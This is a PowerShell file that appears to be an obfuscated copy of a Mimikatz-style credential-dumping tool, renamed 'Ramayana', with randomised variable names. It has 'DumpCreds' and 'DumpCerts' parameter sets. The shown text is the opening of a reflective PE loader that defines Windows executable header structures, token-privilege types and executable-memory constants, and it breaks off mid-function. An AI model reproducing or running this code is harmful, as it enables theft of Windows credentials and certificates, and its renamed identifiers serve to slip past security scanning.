function Ramayana
{
[CmdletBinding(DefaultParameterSetName="DumpCreds")]
Param(
	[Parameter(Position = 0)]
	[String[]]
	$LOsNHuoF99,
    [Parameter(ParameterSetName = "DumpCreds", Position = 1)]
    [Switch]
    $pJeBUiVp99,
    [Parameter(ParameterSetName = "DumpCerts", Position = 1)]
    [Switch]
    $qgFsYHrF99,
    [Parameter(ParameterSetName = "CustomCommand", Position = 1)]
    [String]
    $Command
)
Set-StrictMode -Version 2
$ErCqbQIS99 = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$MbcbWrKL99,
        [Parameter(Position = 1, Mandatory = $true)]
		[String]
		$NsMtNSPm99,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[String]
		$SUKmLTMw99,
				
		[Parameter(Position = 3, Mandatory = $false)]
		[Int32]
		$CCnSyeSq99,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[String]
		$clirXOYc99,
        [Parameter(Position = 5, Mandatory = $false)]
        [String]
        $DDrAwOrQ99
	)
	
	Function send
	{
		$fsGKSFYp99 = New-Object System.Object
		$wHKdkXRN99 = [AppDomain]::CurrentDomain
		$pZQmNyeC99 = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$zlIsVzgQ99 = $wHKdkXRN99.DefineDynamicAssembly($pZQmNyeC99, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$fOKOrgux99 = $zlIsVzgQ99.DefineDynamicModule('DynamicModule', $false)
		$fseNbomE99 = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
		$yxYoLpju99 = $fOKOrgux99.DefineEnum('MachineType', 'Public', [UInt16])
		$yxYoLpju99.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$yxYoLpju99.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$yxYoLpju99.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$yxYoLpju99.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$ekNeVjrx99 = $yxYoLpju99.CreateType()
		$fsGKSFYp99 | Add-Member -MemberType NoteProperty -Name MachineType -Value $ekNeVjrx99
		$yxYoLpju99 = $fOKOrgux99.DefineEnum('MagicType', 'Public', [UInt16])
		$yxYoLpju99.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$yxYoLpju99.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$BnkDVxsq99 = $yxYoLpju99.CreateType()
		$fsGKSFYp99 | Add-Member -MemberType NoteProperty -Name MagicType -Value $BnkDVxsq99
		$yxYoLpju99 = $fOKOrgux99.DefineEnum('SubSystemType', 'Public', [UInt16])
		$yxYoLpju99.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$yxYoLpju99.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$yxYoLpju99.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$yxYoLpju99.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$yxYoLpju99.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$yxYoLpju99.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$yxYoLpju99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$yxYoLpju99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$yxYoLpju99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$yxYoLpju99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$yxYoLpju99.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$EUAZacXK99 = $yxYoLpju99.CreateType()
		$fsGKSFYp99 | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $EUAZacXK99
		$yxYoLpju99 = $fOKOrgux99.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$yxYoLpju99.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$yxYoLpju99.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$yxYoLpju99.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$yxYoLpju99.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$yxYoLpju99.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$yxYoLpju99.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$yxYoLpju99.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$yxYoLpju99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$yxYoLpju99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$yxYoLpju99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$yxYoLpju99.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$yxYoLpju99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$yxYoLpju99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$STQFMeZP99 = $yxYoLpju99.CreateType()
		$fsGKSFYp99 | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $STQFMeZP99
		$qYIxjOBB99 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$yxYoLpju99 = $fOKOrgux99.DefineType('IMAGE_DATA_DIRECTORY', $qYIxjOBB99, [System.ValueType], 8)
		($yxYoLpju99.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($yxYoLpju99.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$DfIFMQoF99 = $yxYoLpju99.CreateType()
		$fsGKSFYp99 | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $DfIFMQoF99
		$qYIxjOBB99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$yxYoLpju99 = $fOKOrgux99.DefineType('IMAGE_FILE_HEADER', $qYIxjOBB99, [System.ValueType], 20)
		$yxYoLpju99.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$yxYoLpju99.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$yxYoLpju99.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$yxYoLpju99.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$yxYoLpju99.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$yxYoLpju99.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$yxYoLpju99.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$RLKLkQdt99 = $yxYoLpju99.CreateType()
		$fsGKSFYp99 | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $RLKLkQdt99
		$qYIxjOBB99 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$yxYoLpju99 = $fOKOrgux99.DefineType('IMAGE_OPTIONAL_HEADER64', $qYIxjOBB99, [System.ValueType], 240)
		($yxYoLpju99.DefineField('Magic', $BnkDVxsq99, 'Public')).SetOffset(0) | Out-Null
		($yxYoLpju99.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($yxYoLpju99.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($yxYoLpju99.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($yxYoLpju99.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($yxYoLpju99.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($yxYoLpju99.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($yxYoLpju99.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($yxYoLpju99.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($yxYoLpju99.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($yxYoLpju99.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($yxYoLpju99.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($yxYoLpju99.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($yxYoLpju99.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($yxYoLpju99.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($yxYoLpju99.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($yxYoLpju99.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($yxYoLpju99.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($yxYoLpju99.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($yxYoLpju99.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($yxYoLpju99.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($yxYoLpju99.DefineField('Subsystem', $EUAZacXK99, 'Public')).SetOffset(68) | Out-Null
		($yxYoLpju99.DefineField('DllCharacteristics', $STQFMeZP99, 'Public')).SetOffset(70) | Out-Null
		($yxYoLpju99.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($yxYoLpju99.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($yxYoLpju99.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($yxYoLpju99.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($yxYoLpju99.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($yxYoLpju99.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($yxYoLpju99.DefineField('ExportTable', $DfIFMQoF99, 'Public')).SetOffset(112) | Out-Null
		($yxYoLpju99.DefineField('ImportTable', $DfIFMQoF99, 'Public')).SetOffset(120) | Out-Null
		($yxYoLpju99.DefineField('ResourceTable', $DfIFMQoF99, 'Public')).SetOffset(128) | Out-Null
		($yxYoLpju99.DefineField('ExceptionTable', $DfIFMQoF99, 'Public')).SetOffset(136) | Out-Null
		($yxYoLpju99.DefineField('CertificateTable', $DfIFMQoF99, 'Public')).SetOffset(144) | Out-Null
		($yxYoLpju99.DefineField('BaseRelocationTable', $DfIFMQoF99, 'Public')).SetOffset(152) | Out-Null
		($yxYoLpju99.DefineField('Debug', $DfIFMQoF99, 'Public')).SetOffset(160) | Out-Null
		($yxYoLpju99.DefineField('Architecture', $DfIFMQoF99, 'Public')).SetOffset(168) | Out-Null
		($yxYoLpju99.DefineField('GlobalPtr', $DfIFMQoF99, 'Public')).SetOffset(176) | Out-Null
		($yxYoLpju99.DefineField('TLSTable', $DfIFMQoF99, 'Public')).SetOffset(184) | Out-Null
		($yxYoLpju99.DefineField('LoadConfigTable', $DfIFMQoF99, 'Public')).SetOffset(192) | Out-Null
		($yxYoLpju99.DefineField('BoundImport', $DfIFMQoF99, 'Public')).SetOffset(200) | Out-Null
		($yxYoLpju99.DefineField('IAT', $DfIFMQoF99, 'Public')).SetOffset(208) | Out-Null
		($yxYoLpju99.DefineField('DelayImportDescriptor', $DfIFMQoF99, 'Public')).SetOffset(216) | Out-Null
		($yxYoLpju99.DefineField('CLRRuntimeHeader', $DfIFMQoF99, 'Public')).SetOffset(224) | Out-Null
		($yxYoLpju99.DefineField('Reserved', $DfIFMQoF99, 'Public')).SetOffset(232) | Out-Null
		$fwZsxzTT99 = $yxYoLpju99.CreateType()
		$fsGKSFYp99 | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $fwZsxzTT99
		$qYIxjOBB99 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$yxYoLpju99 = $fOKOrgux99.DefineType('IMAGE_OPTIONAL_HEADER32', $qYIxjOBB99, [System.ValueType], 224)
		($yxYoLpju99.DefineField('Magic', $BnkDVxsq99, 'Public')).SetOffset(0) | Out-Null
		($yxYoLpju99.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($yxYoLpju99.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($yxYoLpju99.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($yxYoLpju99.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($yxYoLpju99.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($yxYoLpju99.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($yxYoLpju99.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($yxYoLpju99.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($yxYoLpju99.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($yxYoLpju99.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($yxYoLpju99.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($yxYoLpju99.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($yxYoLpju99.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($yxYoLpju99.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($yxYoLpju99.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($yxYoLpju99.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($yxYoLpju99.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($yxYoLpju99.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($yxYoLpju99.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($yxYoLpju99.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($yxYoLpju99.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($yxYoLpju99.DefineField('Subsystem', $EUAZacXK99, 'Public')).SetOffset(68) | Out-Null
		($yxYoLpju99.DefineField('DllCharacteristics', $STQFMeZP99, 'Public')).SetOffset(70) | Out-Null
		($yxYoLpju99.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($yxYoLpju99.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($yxYoLpju99.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($yxYoLpju99.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($yxYoLpju99.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($yxYoLpju99.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($yxYoLpju99.DefineField('ExportTable', $DfIFMQoF99, 'Public')).SetOffset(96) | Out-Null
		($yxYoLpju99.DefineField('ImportTable', $DfIFMQoF99, 'Public')).SetOffset(104) | Out-Null
		($yxYoLpju99.DefineField('ResourceTable', $DfIFMQoF99, 'Public')).SetOffset(112) | Out-Null
		($yxYoLpju99.DefineField('ExceptionTable', $DfIFMQoF99, 'Public')).SetOffset(120) | Out-Null
		($yxYoLpju99.DefineField('CertificateTable', $DfIFMQoF99, 'Public')).SetOffset(128) | Out-Null
		($yxYoLpju99.DefineField('BaseRelocationTable', $DfIFMQoF99, 'Public')).SetOffset(136) | Out-Null
		($yxYoLpju99.DefineField('Debug', $DfIFMQoF99, 'Public')).SetOffset(144) | Out-Null
		($yxYoLpju99.DefineField('Architecture', $DfIFMQoF99, 'Public')).SetOffset(152) | Out-Null
		($yxYoLpju99.DefineField('GlobalPtr', $DfIFMQoF99, 'Public')).SetOffset(160) | Out-Null
		($yxYoLpju99.DefineField('TLSTable', $DfIFMQoF99, 'Public')).SetOffset(168) | Out-Null
		($yxYoLpju99.DefineField('LoadConfigTable', $DfIFMQoF99, 'Public')).SetOffset(176) | Out-Null
		($yxYoLpju99.DefineField('BoundImport', $DfIFMQoF99, 'Public')).SetOffset(184) | Out-Null
		($yxYoLpju99.DefineField('IAT', $DfIFMQoF99, 'Public')).SetOffset(192) | Out-Null
		($yxYoLpju99.DefineField('DelayImportDescriptor', $DfIFMQoF99, 'Public')).SetOffset(200) | Out-Null
		($yxYoLpju99.DefineField('CLRRuntimeHeader', $DfIFMQoF99, 'Public')).SetOffset(208) | Out-Null
		($yxYoLpju99.DefineField('Reserved', $DfIFMQoF99, 'Public')).SetOffset(216) | Out-Null
		$RAMhygra99 = $yxYoLpju99.CreateType()
		$fsGKSFYp99 | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $RAMhygra99
		$qYIxjOBB99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$yxYoLpju99 = $fOKOrgux99.DefineType('IMAGE_NT_HEADERS64', $qYIxjOBB99, [System.ValueType], 264)
		$yxYoLpju99.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$yxYoLpju99.DefineField('FileHeader', $RLKLkQdt99, 'Public') | Out-Null
		$yxYoLpju99.DefineField('OptionalHeader', $fwZsxzTT99, 'Public') | Out-Null
		$thDkPHWa99 = $yxYoLpju99.CreateType()
		$fsGKSFYp99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $thDkPHWa99
		
		$qYIxjOBB99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$yxYoLpju99 = $fOKOrgux99.DefineType('IMAGE_NT_HEADERS32', $qYIxjOBB99, [System.ValueType], 248)
		$yxYoLpju99.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$yxYoLpju99.DefineField('FileHeader', $RLKLkQdt99, 'Public') | Out-Null
		$yxYoLpju99.DefineField('OptionalHeader', $RAMhygra99, 'Public') | Out-Null
		$dsBJdJbg99 = $yxYoLpju99.CreateType()
		$fsGKSFYp99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $dsBJdJbg99
		$qYIxjOBB99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$yxYoLpju99 = $fOKOrgux99.DefineType('IMAGE_DOS_HEADER', $qYIxjOBB99, [System.ValueType], 64)
		$yxYoLpju99.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$yxYoLpju99.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$yxYoLpju99.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$yxYoLpju99.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$yxYoLpju99.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$yxYoLpju99.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$yxYoLpju99.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$yxYoLpju99.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$yxYoLpju99.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$yxYoLpju99.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$yxYoLpju99.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$yxYoLpju99.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$yxYoLpju99.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$yxYoLpju99.DefineField('e_ovno', [UInt16], 'Public') | Out-Null
		$kvbgUINQ99 = $yxYoLpju99.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$SFkNOVso99 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$EHFANLkx99 = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$wVjxCinm99 = New-Object System.Reflection.Emit.CustomAttributeBuilder($fseNbomE99, $SFkNOVso99, $EHFANLkx99, @([Int32] 4))
		$kvbgUINQ99.SetCustomAttribute($wVjxCinm99)
		$yxYoLpju99.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$yxYoLpju99.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null
		$oRiYDEWz99 = $yxYoLpju99.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$SFkNOVso99 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$wVjxCinm99 = New-Object System.Reflection.Emit.CustomAttributeBuilder($fseNbomE99, $SFkNOVso99, $EHFANLkx99, @([Int32] 10))
		$oRiYDEWz99.SetCustomAttribute($wVjxCinm99)
		$yxYoLpju99.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$DnFAnDUW99 = $yxYoLpju99.CreateType()	
		$fsGKSFYp99 | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $DnFAnDUW99
		$qYIxjOBB99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$yxYoLpju99 = $fOKOrgux99.DefineType('IMAGE_SECTION_HEADER', $qYIxjOBB99, [System.ValueType], 40)
		$MzfEqwFX99 = $yxYoLpju99.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$SFkNOVso99 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$wVjxCinm99 = New-Object System.Reflection.Emit.CustomAttributeBuilder($fseNbomE99, $SFkNOVso99, $EHFANLkx99, @([Int32] 8))
		$MzfEqwFX99.SetCustomAttribute($wVjxCinm99)
		$yxYoLpju99.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$yxYoLpju99.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$yxYoLpju99.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$yxYoLpju99.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$yxYoLpju99.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$yxYoLpju99.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$yxYoLpju99.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$yxYoLpju99.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$yxYoLpju99.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$YMTRBpYh99 = $yxYoLpju99.CreateType()
		$fsGKSFYp99 | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $YMTRBpYh99
		$qYIxjOBB99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$yxYoLpju99 = $fOKOrgux99.DefineType('IMAGE_BASE_RELOCATION', $qYIxjOBB99, [System.ValueType], 8)
		$yxYoLpju99.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$yxYoLpju99.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$mAazBzPO99 = $yxYoLpju99.CreateType()
		$fsGKSFYp99 | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $mAazBzPO99
		$qYIxjOBB99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$yxYoLpju99 = $fOKOrgux99.DefineType('IMAGE_IMPORT_DESCRIPTOR', $qYIxjOBB99, [System.ValueType], 20)
		$yxYoLpju99.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$yxYoLpju99.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$yxYoLpju99.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$yxYoLpju99.DefineField('Name', [UInt32], 'Public') | Out-Null
		$yxYoLpju99.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$rOSZubsS99 = $yxYoLpju99.CreateType()
		$fsGKSFYp99 | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $rOSZubsS99
		$qYIxjOBB99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$yxYoLpju99 = $fOKOrgux99.DefineType('IMAGE_EXPORT_DIRECTORY', $qYIxjOBB99, [System.ValueType], 40)
		$yxYoLpju99.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$yxYoLpju99.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$yxYoLpju99.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$yxYoLpju99.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$yxYoLpju99.DefineField('Name', [UInt32], 'Public') | Out-Null
		$yxYoLpju99.DefineField('Base', [UInt32], 'Public') | Out-Null
		$yxYoLpju99.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$yxYoLpju99.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$yxYoLpju99.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$yxYoLpju99.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$yxYoLpju99.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$mfTfpUDK99 = $yxYoLpju99.CreateType()
		$fsGKSFYp99 | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $mfTfpUDK99
		
		$qYIxjOBB99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$yxYoLpju99 = $fOKOrgux99.DefineType('LUID', $qYIxjOBB99, [System.ValueType], 8)
		$yxYoLpju99.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$yxYoLpju99.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $yxYoLpju99.CreateType()
		$fsGKSFYp99 | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		$qYIxjOBB99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$yxYoLpju99 = $fOKOrgux99.DefineType('LUID_AND_ATTRIBUTES', $qYIxjOBB99, [System.ValueType], 12)
		$yxYoLpju99.DefineField('Luid', $LUID, 'Public') | Out-Null
		$yxYoLpju99.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$lznJqUEM99 = $yxYoLpju99.CreateType()
		$fsGKSFYp99 | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $lznJqUEM99
		
		$qYIxjOBB99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$yxYoLpju99 = $fOKOrgux99.DefineType('TOKEN_PRIVILEGES', $qYIxjOBB99, [System.ValueType], 16)
		$yxYoLpju99.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$yxYoLpju99.DefineField('Privileges', $lznJqUEM99, 'Public') | Out-Null
		$sxFLLuQh99 = $yxYoLpju99.CreateType()
		$fsGKSFYp99 | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $sxFLLuQh99
		return $fsGKSFYp99
	}
	Function sidetracks
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
